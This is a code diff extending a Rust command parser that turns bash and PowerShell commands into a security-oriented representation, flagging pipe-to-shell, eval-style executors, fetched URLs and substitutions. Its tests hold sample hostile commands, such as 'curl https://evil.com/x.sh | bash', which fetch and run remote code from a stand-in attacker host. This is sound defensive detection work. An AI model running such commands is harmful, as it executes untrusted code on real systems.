@@ -1,3 +1,9 @@
+mod context;
+mod powershell;
+
+pub use context::matches_context;
+pub use powershell::{is_powershell_command, parse_powershell};
+
 use std::collections::HashSet;
 
 use serde::{Deserialize, Serialize};
@@ -13,15 +19,34 @@ pub enum AstError {
     ParseFailed,
 }
 
-/// Structured intermediate representation of a shell command.
+#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(rename_all = "lowercase")]
+pub enum ShellDialect {
+    #[default]
+    Bash,
+    PowerShell,
+}
+
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct RedirectTarget {
+    pub path: String,
+    pub operator: String,
+}
+
 #[derive(Debug, Clone, Default, Serialize, Deserialize)]
 pub struct CommandIr {
     pub pipelines: Vec<Pipeline>,
     pub has_command_substitution: bool,
     pub has_heredoc: bool,
+    pub has_process_substitution: bool,
+    pub has_brace_expansion: bool,
+    pub has_arithmetic_expansion: bool,
+    pub shell_dialect: ShellDialect,
+    pub obfuscation_hint: bool,
     pub indirect_executors: Vec<String>,
     pub external_urls: Vec<String>,
     pub pipe_to_shell: bool,
+    pub substitution_bodies: Vec<String>,
 }
 
 #[derive(Debug, Clone, Default, Serialize, Deserialize)]
@@ -33,10 +58,48 @@ pub struct Pipeline {
 pub struct CommandNode {
     pub name: String,
     pub args: Vec<String>,
-    pub redirects: Vec<String>,
+    pub flags: Vec<String>,
+    pub redirects: Vec<RedirectTarget>,
 }
 
-/// Parse bash/sh commands into a security-oriented IR.
+pub struct CommandParser {
+    bash: BashParser,
+}
+
+impl Default for CommandParser {
+    fn default() -> Self {
+        Self {
+            bash: BashParser::new().expect("bash grammar"),
+        }
+    }
+}
+
+impl CommandParser {
+    pub fn new() -> Result<Self, AstError> {
+        Ok(Self {
+            bash: BashParser::new()?,
+        })
+    }
+
+    pub fn parse(&mut self, source: &str) -> Result<CommandIr, AstError> {
+        if is_powershell_command(source) {
+            return Ok(parse_powershell(source));
+        }
+        self.bash.parse(source)
+    }
+}
+
+pub fn parse_command(source: &str) -> Result<CommandIr, AstError> {
+    CommandParser::new()?.parse(source)
+}
+
+pub fn extract_commands(ir: &CommandIr) -> Vec<CommandNode> {
+    ir.pipelines
+        .iter()
+        .flat_map(|p| p.commands.clone())
+        .collect()
+}
+
 pub struct BashParser {
     parser: Parser,
 }
@@ -61,7 +124,10 @@ impl BashParser {
 }
 
 fn build_ir(source: &str, root: &Node) -> CommandIr {
-    let mut ir = CommandIr::default();
+    let mut ir = CommandIr {
+        shell_dialect: ShellDialect::Bash,
+        ..CommandIr::default()
+    };
     let mut current_pipeline = Pipeline::default();
 
     walk_node(source, *root, &mut ir, &mut current_pipeline);
@@ -85,15 +151,57 @@ fn walk_node(source: &str, node: Node, ir: &mut CommandIr, pipeline: &mut Pipeli
                 ir.pipelines.push(inner);
             }
         }
+        "redirected_statement" => {
+            let mut redirects = Vec::new();
+            let mut inner_cmd: Option<Node> = None;
+            for child in node.children(&mut node.walk()) {
+                match child.kind() {
+                    "file_redirect" | "heredoc_redirect" | "herestring_redirect" => {
+                        if let Some(rt) = extract_redirect(source, &child) {
+                            ir.has_heredoc |= child.kind().contains("heredoc")
+                                || child.kind().contains("herestring");
+                            redirects.push(rt);
+                        }
+                    }
+                    "command" | "declaration_command" => inner_cmd = Some(child),
+                    _ => {}
+                }
+            }
+            if let Some(cmd_node) = inner_cmd {
+                if let Some(mut cmd) = extract_command(source, &cmd_node, ir) {
+                    cmd.redirects.extend(redirects);
+                    pipeline.commands.push(cmd);
+                }
+            }
+        }
         "command" | "declaration_command" => {
             if let Some(cmd) = extract_command(source, &node, ir) {
                 pipeline.commands.push(cmd);
             }
+            for child in node.children(&mut node.walk()) {
+                walk_node(source, child, ir, pipeline);
+            }
         }
         "command_substitution" => {
             ir.has_command_substitution = true;
+            ir.substitution_bodies.push(node_text(source, &node));
+            for child in node.children(&mut node.walk()) {
+                walk_node(source, child, ir, pipeline);
+            }
         }
-        "heredoc_body" | "heredoc_redirect" => {
+        "process_substitution" => {
+            ir.has_process_substitution = true;
+            for child in node.children(&mut node.walk()) {
+                walk_node(source, child, ir, pipeline);
+            }
+        }
+        "arithmetic_expansion" => {
+            ir.has_arithmetic_expansion = true;
+        }
+        "brace_expansion" => {
+            ir.has_brace_expansion = true;
+        }
+        "heredoc_body" | "heredoc_redirect" | "herestring_redirect" => {
             ir.has_heredoc = true;
         }
         _ => {
@@ -104,9 +212,23 @@ fn walk_node(source: &str, node: Node, ir: &mut CommandIr, pipeline: &mut Pipeli
     }
 }
 
+fn extract_redirect(source: &str, node: &Node) -> Option<RedirectTarget> {
+    let text = node_text(source, node);
+    let operator = text
+        .chars()
+        .take_while(|c| *c == '>' || *c == '<' || *c == '&')
+        .collect::<String>();
+    let path = text.trim_start_matches(['>', '<', '&', ' ']).to_string();
+    if path.is_empty() {
+        return None;
+    }
+    Some(RedirectTarget { path, operator })
+}
+
 fn extract_command(source: &str, node: &Node, ir: &mut CommandIr) -> Option<CommandNode> {
     let mut name = String::new();
     let mut args = Vec::new();
+    let mut flags = Vec::new();
 
     for child in node.children(&mut node.walk()) {
         match child.kind() {
@@ -120,14 +242,10 @@ fn extract_command(source: &str, node: &Node, ir: &mut CommandIr) -> Option<Comm
                 if name.is_empty() {
                     name = text;
                 } else {
-                    args.push(text);
-                }
-            }
-            "redirected_statement" => {
-                for sub in child.children(&mut child.walk()) {
-                    if sub.kind() == "file_redirect" {
-                        args.push(node_text(source, &sub));
+                    if text.starts_with('-') {
+                        flags.push(text.clone());
                     }
+                    args.push(text);
                 }
             }
             _ => {}
@@ -138,32 +256,35 @@ fn extract_command(source: &str, node: &Node, ir: &mut CommandIr) -> Option<Comm
         return None;
     }
 
+    annotate_command_metadata(&name, &args, ir);
+
+    Some(CommandNode {
+        name,
+        args,
+        flags,
+        redirects: Vec::new(),
+    })
+}
+
+fn annotate_command_metadata(name: &str, args: &[String], ir: &mut CommandIr) {
     let indirect = ["eval", "source", ".", "exec", "bash", "sh", "zsh", "dash"];
-    if indirect.contains(&name.as_str()) {
-        ir.indirect_executors.push(name.clone());
+    if indirect.contains(&name) {
+        ir.indirect_executors.push(name.to_string());
     }
 
-    if matches!(
-        name.as_str(),
-        "python" | "python3" | "node" | "perl" | "ruby"
-    ) && args.iter().any(|a| a == "-c" || a == "-e")
+    if matches!(name, "python" | "python3" | "node" | "perl" | "ruby")
+        && args.iter().any(|a| a == "-c" || a == "-e")
     {
         ir.indirect_executors.push(format!("{name} -c"));
     }
 
-    if matches!(name.as_str(), "curl" | "wget" | "fetch") {
-        for arg in &args {
+    if matches!(name, "curl" | "wget" | "fetch") {
+        for arg in args {
             if arg.starts_with("http://") || arg.starts_with("https://") {
                 ir.external_urls.push(arg.clone());
             }
         }
     }
-
-    Some(CommandNode {
-        name,
-        args,
-        redirects: Vec::new(),
-    })
 }
 
 fn node_text(source: &str, node: &Node) -> String {
@@ -187,7 +308,6 @@ fn detect_pipe_to_shell(ir: &mut CommandIr) {
     }
 }
 
-/// Run tree-sitter queries against a command for pattern detection.
 pub fn match_patterns(source: &str, queries: &[&str]) -> Vec<String> {
     let mut parser = match BashParser::new() {
         Ok(p) => p,
@@ -217,17 +337,40 @@ mod tests {
 
     #[test]
     fn parses_simple_command() {
-        let mut parser = BashParser::new().unwrap();
-        let ir = parser.parse("ls -la").unwrap();
+        let ir = parse_command("ls -la").unwrap();
         assert_eq!(ir.pipelines.len(), 1);
         assert_eq!(ir.pipelines[0].commands[0].name, "ls");
     }
 
     #[test]
     fn detects_pipe_to_shell() {
-        let mut parser = BashParser::new().unwrap();
-        let ir = parser.parse("curl https://evil.com/x.sh | bash").unwrap();
+        let ir = parse_command("curl https://evil.com/x.sh | bash").unwrap();
         assert!(ir.pipe_to_shell);
         assert!(!ir.external_urls.is_empty());
+    }
+
+    #[test]
+    fn detects_process_substitution() {
+        let ir = parse_command("cat <(curl evil.com)").unwrap();
+        assert!(ir.has_process_substitution);
+    }
+
+    #[test]
+    fn detects_command_substitution() {
+        let ir = parse_command("echo $(whoami)").unwrap();
+        assert!(ir.has_command_substitution);
+        assert!(!ir.substitution_bodies.is_empty());
+    }
+
+    #[test]
+    fn extract_commands_flatten() {
+        let ir = parse_command("ls | grep foo").unwrap();
+        assert_eq!(extract_commands(&ir).len(), 2);
+    }
+
+    #[test]
+    fn powershell_routing() {
+        let ir = parse_command("Invoke-Expression $x").unwrap();
+        assert_eq!(ir.shell_dialect, ShellDialect::PowerShell);
     }
 }
